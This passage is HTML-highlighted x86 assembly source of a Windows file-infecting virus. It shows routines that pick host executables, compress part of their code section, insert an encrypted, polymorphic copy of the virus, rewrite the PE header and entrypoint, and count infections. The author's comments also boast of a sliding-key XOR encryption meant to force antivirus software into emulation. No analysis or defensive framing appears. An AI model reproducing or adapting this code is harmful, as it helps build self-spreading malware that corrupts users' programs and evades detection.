    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; and edx</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; check if entrypoint</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">CloseFile</span><span class="sc0">               </span><span class="sc1">; &lt;&gt; code</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">CloseFile</span><span class="sc0">               </span><span class="sc1">;then we have compress.</span><span class="sc0">
                            </span><span class="sc1">; file</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc2">080000000h</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc2">75000</span><span class="sc0">        </span><span class="sc1">; look if big enough</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">infectionmethod2</span><span class="sc0">            </span><span class="sc1">; some PE are 4 megs</span><span class="sc0">
                            </span><span class="sc1">; ie: FF7 executable</span><span class="sc0">
                            </span><span class="sc1">; if so then compress</span><span class="sc0">
                            </span><span class="sc1">; partially</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; now check if EP </span><span class="sc0">
                            </span><span class="sc1">; - codesection is</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">75000</span><span class="sc0">               </span><span class="sc1">; smaller, so we</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">infectionmethod3</span><span class="sc0">            </span><span class="sc1">; will have to fix that</span><span class="sc0">
                            </span><span class="sc1">; too</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; okay all right</span><span class="sc0">
                            </span><span class="sc1">; proceed compression</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileOffset</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_file</span><span class="sc0">               </span><span class="sc1">; going to entry offset</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; set size as encrypt</span><span class="sc0">
                            </span><span class="sc1">; val :)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DropcryptedVirus</span><span class="sc0">            </span><span class="sc1">; make a encrypted ver.</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">75000</span><span class="sc0">               </span><span class="sc1">; set how much to </span><span class="sc0">
                            </span><span class="sc1">; compress</span><span class="sc0">

</span><span class="sc5">Compresslookup</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; generic infection method</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TakenByte</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">; save crypted virus to </span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DropcryptedVirus</span><span class="sc0">        </span><span class="sc1">; buffer</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read_file</span><span class="sc0">           </span><span class="sc1">; read how much byte to compres</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compressbuffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DropStubLoader</span><span class="sc0">          </span><span class="sc1">; then put the decompression</span><span class="sc0">
                        </span><span class="sc1">; stub (about 500 bytes)</span><span class="sc0">
                </span><span class="sc1">; (it have to alloc/init find kernel, apis..)</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">pseudofin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">     </span><span class="sc1">; so compress virus </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">databuffer</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; </span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DarkCMP</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">seed</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; randomizing decryptors :)</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TakenByte</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; look how much compression</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">CloseFile</span><span class="sc0">           </span><span class="sc1">; we got if &gt; ?</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">numberloop</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; reset number of algorithm</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; fuck, can't remember why</span><span class="sc0">
                        </span><span class="sc1">; I did this instruction</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">Checknext</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">numberloop</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; make 1 more algos...</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">seed</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; making allways </span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">seed</span><span class="sc4">],</span><span class="sc2">0FFFFFh</span><span class="sc0">        </span><span class="sc1">; get all this number</span><span class="sc0">
                            </span><span class="sc1">; of possible number</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compressbuffer</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; so now make poly of</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">databuffer</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; it</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Restore</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; set where poly will</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; be in memory</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">poly</span><span class="sc0">                    </span><span class="sc1">; poly this</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">numberloop</span><span class="sc4">],</span><span class="sc2">10</span><span class="sc0">        </span><span class="sc1">; we reached the end</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">CloseFile0</span><span class="sc0">              </span><span class="sc1">; without finding good</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TakenByte</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; compression algos ?</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">Checknext</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; stack reajustement</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InitCritical</span><span class="sc0">                </span><span class="sc1">; stop other main thread</span><span class="sc0">
                            </span><span class="sc1">; don't want to be</span><span class="sc0">
</span><span class="sc1">;   pushad                      ; annoyed during </span><span class="sc0">
</span><span class="sc1">;                           ; infection procedure</span><span class="sc0">
</span><span class="sc1">;   push    1</span><span class="sc0">
</span><span class="sc1">;   lea eax,dword ptr [ebp+caption]</span><span class="sc0">
</span><span class="sc1">;   push    eax</span><span class="sc0">
</span><span class="sc1">;   lea edx,word ptr [ebp+workingdir]</span><span class="sc0">
</span><span class="sc1">;   push    edx</span><span class="sc0">
</span><span class="sc1">;   push    0</span><span class="sc0">
</span><span class="sc1">;   call    dword ptr [ebp+MessageBoxA]     </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   mov dword ptr [esp+20h-4],eax</span><span class="sc0">
</span><span class="sc1">;   popad</span><span class="sc0">

</span><span class="sc1">;   cmp eax,2</span><span class="sc0">
</span><span class="sc1">;   je  cretino1</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderOffset</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_file</span><span class="sc0">               </span><span class="sc1">; go to where we read</span><span class="sc0">
                            </span><span class="sc1">; to the header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc2">4096</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc4">)+</span><span class="sc2">0f8h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReadyForHost</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; rewrite the header</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write_file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileOffset</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; go to where we took</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_file</span><span class="sc0">               </span><span class="sc1">; compressed datas</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">databuffer</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write_file</span><span class="sc0">              </span><span class="sc1">; write it to file</span><span class="sc0">

</span><span class="sc5">cretino1</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LeaveCritical</span><span class="sc0">               </span><span class="sc1">; resume thread</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infcount</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; increment infection</span><span class="sc0">

</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">finfi</span><span class="sc0">                   </span><span class="sc1">; stop file</span><span class="sc0">

</span><span class="sc5">CloseFile0</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">finfi</span><span class="sc0">                   </span><span class="sc1">; stoping poly loop</span><span class="sc0">
                            </span><span class="sc1">; creation</span><span class="sc0">
</span><span class="sc5">infectionmethod2</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; check if code</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">45000</span><span class="sc0">               </span><span class="sc1">; is bigger than 45000</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">CloseFile</span><span class="sc0">               </span><span class="sc1">; else go away</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileOffset</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_file</span><span class="sc0">               </span><span class="sc1">; go to start of sect</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; set entry to there</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Restore</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; set for poly</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Compresslookup</span><span class="sc0">              </span><span class="sc1">; go infect it</span><span class="sc0">

</span><span class="sc5">infectionmethod3</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">  
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">75000</span><span class="sc0">           </span><span class="sc1">; get end of sec - 75000</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; then get offset</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; set entrypoint</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Restore</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileOffset</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">      </span><span class="sc1">; and drop offset</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_file</span><span class="sc0">               </span><span class="sc1">; go overthere</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">75000</span><span class="sc0">               </span><span class="sc1">;full compression buff.</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Compresslookup</span><span class="sc0">

</span><span class="sc5">DropcryptedVirus</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">encrypt</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">databuffer</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;I don't saved the</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">pseudofin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">     </span><span class="sc1">;key so avers will have</span><span class="sc0">
        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;to test every poss.</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">pseudofin</span><span class="sc4">-</span><span class="sc5">StartCrypt</span><span class="sc0">    </span><span class="sc1">; how much to encrypt</span><span class="sc0">

</span><span class="sc5">gegenviom</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc0">               </span><span class="sc1">; this is sliding key</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; hohoho, you will</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">99</span><span class="sc0">               </span><span class="sc1">; have to emulate</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; each loop</span><span class="sc0">
    
